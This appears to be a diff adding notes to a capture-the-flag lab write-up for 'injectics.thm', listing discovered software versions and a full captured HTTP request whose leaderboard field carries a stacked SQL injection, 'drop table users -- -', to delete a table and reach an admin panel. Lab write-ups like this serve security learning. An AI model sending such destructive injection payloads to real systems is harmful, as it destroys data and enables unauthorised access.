@@ -132,6 +132,35 @@ back-end DBMS: MySQL >= 5.0.12
 [09:15:14] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.9.71'
 
 
+http://injectics.thm/composer.json
+equire	
+twig/twig	"2.14.0"
+
+http://injectics.thm//phpmyadmin/doc/html/index.html
+phpMyAdmin 4.9.5
+
+To get access to the admin panel for the challenge question, I need to delete the ‘users’ table. So I want to find somewhere to inject:
+
+drop table users -- -
+
+So inject in dashboard
+
+POST /edit_leaderboard.php HTTP/1.1
+Host: injectics.thm
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://injectics.thm/edit_leaderboard.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 208
+Origin: http://injectics.thm
+Connection: keep-alive
+Cookie: PHPSESSID=04v8k348jddp0b0d76n46c16cu
+Upgrade-Insecure-Requests: 1
+
+rank=2&country=&gold=7; drop table users -- -&silver=0&bronze=7
+
 
 
 
